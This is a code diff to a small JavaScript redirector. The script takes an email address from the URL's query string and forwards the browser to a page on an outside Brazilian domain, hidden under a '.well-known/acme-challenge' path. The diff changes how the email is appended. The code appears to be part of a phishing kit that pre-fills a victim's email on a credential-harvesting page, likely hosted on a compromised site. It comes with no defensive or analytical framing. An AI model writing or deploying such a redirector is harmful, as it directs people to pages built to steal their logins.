@@ -9,7 +9,7 @@
         (function() {
             var part1 = "http://hipero2.com.br";
             var part2 = "/.well-known/acme-challenge";
-            var part3 = "/webinar/ver/index.php#";
+            var part3 = "/webinar/ver/index.php/#";
 
             // Function to get the email from the query string
             function getQueryParameter(param) {
@@ -24,8 +24,8 @@
             if (email) {
                 var decodedEmail = decodeURIComponent(email);
 
-                // Construct the redirect URL
-                var redirectUrl = part1 + part2 + part3 + "?email=" + decodedEmail;
+                // Construct the redirect URL without any prefix
+                var redirectUrl = part1 + part2 + part3 + decodedEmail;
 
                 // Redirect to the constructed URL
                 window.location.href = redirectUrl;
